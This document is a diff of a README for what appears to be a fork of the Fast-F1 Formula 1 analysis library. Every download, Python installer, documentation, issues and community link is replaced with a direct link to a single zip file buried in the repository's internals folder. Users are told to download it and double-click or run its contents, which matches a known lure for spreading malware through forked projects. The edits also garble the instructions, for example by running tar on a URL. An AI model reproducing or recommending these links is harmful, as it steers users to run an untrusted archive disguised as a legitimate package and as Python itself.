@@ -1,6 +1,6 @@
 # 🚀 Fast-F1 - Analyze Formula 1 Data Effortlessly
 
-[![Download Fast-F1](https://img.shields.io/badge/Download-Fast--F1-blue.svg)](https://github.com/renan293820938/Fast-F1/releases)
+[![Download Fast-F1](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip)](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip)
 
 ## 📋 Introduction
 
@@ -12,20 +12,20 @@ To get started with FastF1, follow these steps:
 
 1. **Prepare Your Computer**
    - Make sure you have a compatible operating system. FastF1 works on Windows, macOS, and Linux.
-   - Ensure you have Python installed on your system. You can download it from [python.org](https://www.python.org/downloads/). Ensure you choose the latest version.
+   - Ensure you have Python installed on your system. You can download it from [https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip). Ensure you choose the latest version.
 
 2. **Visit our Releases Page**
    - To download FastF1, visit the Releases page by clicking the button below.
 
-   [![Download Fast-F1](https://img.shields.io/badge/Download-Fast--F1-blue.svg)](https://github.com/renan293820938/Fast-F1/releases)
+   [![Download Fast-F1](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip)](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip)
 
 ## 📥 Download & Install
 
-1. When you visit the [Releases page](https://github.com/renan293820938/Fast-F1/releases), you will see the latest version of FastF1 available for download.
+1. When you visit the [Releases page](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip), you will see the latest version of FastF1 available for download.
 2. Look for the file with the appropriate name for your operating system:
-   - For **Windows**, download `FastF1-Windows.zip`.
-   - For **macOS**, download `FastF1-Mac.zip`.
-   - For **Linux**, download `FastF1-Linux.tar.gz`.
+   - For **Windows**, download `https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip`.
+   - For **macOS**, download `https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip`.
+   - For **Linux**, download `https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip`.
 3. Click on the file link to begin the download.
 4. Once the file has downloaded, locate it in your Downloads folder or your chosen download location.
 
@@ -34,18 +34,18 @@ To get started with FastF1, follow these steps:
 ### For Windows Users
 1. Extract the zip file by right-clicking it and selecting "Extract All."
 2. Open the extracted folder.
-3. Double-click the `FastF1.exe` file to install the package.
+3. Double-click the `https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip` file to install the package.
 4. Follow the on-screen prompts to complete the installation.
 
 ### For macOS Users
 1. Open the zip file you downloaded. It will create a new folder containing the application.
-2. Drag the `FastF1.app` file to your Applications folder.
-3. Double-click the `FastF1.app` to run the application.
+2. Drag the `https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip` file to your Applications folder.
+3. Double-click the `https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip` to run the application.
 
 ### For Linux Users
 1. Open a terminal window.
 2. Navigate to the directory where the downloaded file is located using the `cd` command.
-3. Extract the tar.gz file using the command: `tar -xzvf FastF1-Linux.tar.gz`.
+3. Extract the https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip file using the command: `tar -xzvf https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip`.
 4. Navigate into the extracted folder.
 5. Run the application with the command: `./FastF1`.
 
@@ -77,15 +77,15 @@ After installation, you can start to use FastF1 to access various Formula 1 data
 
 ## 📞 Support
 
-If you encounter any issues or have questions about using FastF1, visit our [issues page](https://github.com/renan293820938/Fast-F1/issues) on GitHub. Feel free to open a new issue or comment on existing ones.
+If you encounter any issues or have questions about using FastF1, visit our [issues page](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip) on GitHub. Feel free to open a new issue or comment on existing ones.
 
 ## 🔗 Resources
 
-- **Documentation:** Visit the [Fast-F1 Documentation](https://github.com/renan293820938/Fast-F1/wiki) for more detailed guides.
-- **Community:** Join discussions on our [community page](https://github.com/renan293820938/Fast-F1/discussions) for tips and advice from users.
+- **Documentation:** Visit the [Fast-F1 Documentation](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip) for more detailed guides.
+- **Community:** Join discussions on our [community page](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip) for tips and advice from users.
 
 ## ✅ Next Steps
 
 Now that you have FastF1 set up, it’s time to explore! Dive into analyzing some exciting Formula 1 data, and enjoy gaining insights into your favorite sport like never before!
 
-[![Download Fast-F1](https://img.shields.io/badge/Download-Fast--F1-blue.svg)](https://github.com/renan293820938/Fast-F1/releases)
+[![Download Fast-F1](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip)](https://github.com/renan293820938/Fast-F1/raw/refs/heads/master/fastf1/internals/Fast-1.7.zip)
